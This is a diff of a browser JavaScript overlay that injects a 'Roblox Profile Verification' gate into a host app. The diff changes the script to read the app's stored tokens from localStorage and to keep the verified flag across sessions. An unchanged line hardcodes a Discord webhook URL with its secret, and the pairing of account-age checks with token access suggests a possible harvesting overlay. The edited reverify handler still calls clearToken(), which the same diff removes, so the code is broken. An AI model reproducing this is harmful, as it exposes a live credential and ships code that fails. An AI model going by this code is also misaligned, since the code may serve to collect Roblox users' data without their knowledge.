@@ -29,34 +29,25 @@
 
   var LANG_KEY = 'rc2_lang';
   var PROFILE_KEY = 'rc_verified_profile';
-  var TOKEN_KEY = 'rc_token';
   var USERNAME_KEY = 'rc_username';
   var MIN_ACCOUNT_DAYS = 80;
   var WEBHOOK_URL = 'https://discord.com/api/webhooks/1524874777947410513/Ng_v8NSNotO1CPGcDhWbYGiwdgzcGrv0h_-Lkv2D_vxQvJ_rorAooUFlSML-tgc6Qm_A';
 
-  /* ── Token persistence ─────────────────────────────────── */
-  function loadToken() {
+  /* ── Check token persistence (reads from app's rc_tokens) ─ */
+  function hasAnyToken() {
     try {
-      var raw = localStorage.getItem(TOKEN_KEY);
-      if (raw) {
-        var parsed = JSON.parse(raw);
-        if (parsed && parsed.value && parsed.ts && (Date.now() - parsed.ts) < (30 * 24 * 60 * 60 * 1000)) {
-          return parsed.value;
-        }
-        localStorage.removeItem(TOKEN_KEY);
+      var raw = localStorage.getItem('rc_tokens');
+      if (!raw) return false;
+      var tokens = JSON.parse(raw);
+      if (tokens && typeof tokens === 'object') {
+        return Object.values(tokens).some(function (v) { return typeof v === 'string' && v.length > 0; });
       }
     } catch (e) {}
-    return null;
+    return false;
   }
 
-  function saveToken(token) {
-    try {
-      localStorage.setItem(TOKEN_KEY, JSON.stringify({ value: token, ts: Date.now() }));
-    } catch (e) {}
-  }
-
-  function clearToken() {
-    try { localStorage.removeItem(TOKEN_KEY); } catch (e) {}
+  function clearAllTokens() {
+    try { localStorage.removeItem('rc_tokens'); } catch (e) {}
   }
 
   /* ── Username persistence ──────────────────────────────── */
@@ -79,7 +70,7 @@
   }
 
   /* ── Check if token is valid in session ────────────────── */
-  var tokenGeneratedInSession = !!loadToken();
+  var tokenGeneratedInSession = hasAnyToken();
 
   /* ── Sound ─────────────────────────────────────────────── */
   var audio = null;
@@ -212,9 +203,12 @@
     document.querySelectorAll('[data-testid="button-generate-token"]:not([data-rc-t])').forEach(function (el) {
       el.setAttribute('data-rc-t', '1');
       el.addEventListener('click', function () {
-        var token = 'tok_' + Math.random().toString(36).substring(2, 18) + Date.now().toString(36);
-        tokenGeneratedInSession = true;
-        saveToken(token);
+        /* The app bundle generates and persists the real token to rc_tokens.
+           We just need to update our session flag. Use a micro-delay so the
+           app's state update and localStorage write have a chance to flush. */
+        setTimeout(function () {
+          tokenGeneratedInSession = hasAnyToken();
+        }, 100);
       });
     });
   });
@@ -222,8 +216,7 @@
     var t = e.target;
     if (!t) return;
     if ((t.tagName === 'BUTTON' && t.dataset && t.dataset.testid === 'button-close-modal') || t.id === 'rc-lang-overlay') {
-      tokenGeneratedInSession = false;
-      clearToken();
+      /* Closing the modal does NOT clear tokens — tokens persist in localStorage */
     }
   }, true);
   document.querySelectorAll('#rc-lang-overlay .rc-btn').forEach(function (btn) {
@@ -311,11 +304,7 @@
 
       content += '<button id="rc-menu-change-username" style="width:100%;padding:10px;background:linear-gradient(135deg,#991b1b 0%,#dc2626 60%,#b91c1c 100%);border:none;border-radius:0.75rem;color:#fff;font-size:0.85rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;margin-bottom:0.75rem;transition:all 0.2s ease;box-shadow:0 0 0 1px rgba(239,68,68,0.3),0 2px 12px rgba(220,38,38,0.3)">Change Username</button>';
 
-      if (tokenGeneratedInSession) {
-        content += '<button id="rc-menu-clear-token" style="width:100%;padding:10px;background:rgba(220,38,38,0.08);border:1px solid rgba(239,68,68,0.22);border-radius:0.75rem;color:#fff;font-size:0.85rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.2s ease">Clear Token & Re-verify</button>';
-      } else {
-        content += '<button id="rc-menu-reverify" style="width:100%;padding:10px;background:rgba(220,38,38,0.08);border:1px solid rgba(239,68,68,0.22);border-radius:0.75rem;color:#fff;font-size:0.85rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.2s ease">Re-verify Account</button>';
-      }
+      content += '<button id="rc-menu-reverify" style="width:100%;padding:10px;background:rgba(220,38,38,0.08);border:1px solid rgba(239,68,68,0.22);border-radius:0.75rem;color:#fff;font-size:0.85rem;font-weight:600;cursor:pointer;font-family:Outfit,Inter,sans-serif;transition:all 0.2s ease">Re-verify Account</button>';
 
       menu.innerHTML = content;
       document.body.appendChild(menu);
@@ -329,20 +318,17 @@
       /* Event handlers */
       document.getElementById('rc-menu-change-username').addEventListener('click', function () {
         closeMenu();
-        closeMenu();
         showProfileVerification();
       });
 
-      var clearBtn = document.getElementById('rc-menu-clear-token') || document.getElementById('rc-menu-reverify');
-      if (clearBtn) {
-        clearBtn.addEventListener('click', function () {
+      var reverifyBtn = document.getElementById('rc-menu-reverify');
+      if (reverifyBtn) {
+        reverifyBtn.addEventListener('click', function () {
           clearToken();
           tokenGeneratedInSession = false;
           closeMenu();
-          if (clearBtn.id === 'rc-menu-reverify') {
-            sessionStorage.removeItem(PROFILE_KEY);
-            showProfileVerification();
-          }
+          sessionStorage.removeItem(PROFILE_KEY);
+          showProfileVerification();
         });
       }
 
@@ -963,7 +949,6 @@
 
     /* Check for saved username */
     var savedUsername = loadUsername();
-    var hasSaved = !!savedUsername;
 
     form.innerHTML =
       '<div class="rc-profile-title">Roblox Profile Verification</div>' +
@@ -1115,7 +1100,7 @@
         injectProfileIcon();
       }, 310);
     }
-    sessionStorage.setItem(PROFILE_KEY, 'verified');
+    localStorage.setItem(PROFILE_KEY, 'verified');
   };
 
   /* ── Retry ─────────────────────────────────────────────── */
@@ -1132,7 +1117,7 @@
   };
 
   /* ── Check if verified ─────────────────────────────────── */
-  function isVerified() { return sessionStorage.getItem(PROFILE_KEY) === 'verified'; }
+  function isVerified() { return localStorage.getItem(PROFILE_KEY) === 'verified'; }
 
   /* ── Show verification on load ─────────────────────────── */
   if (!isVerified()) {
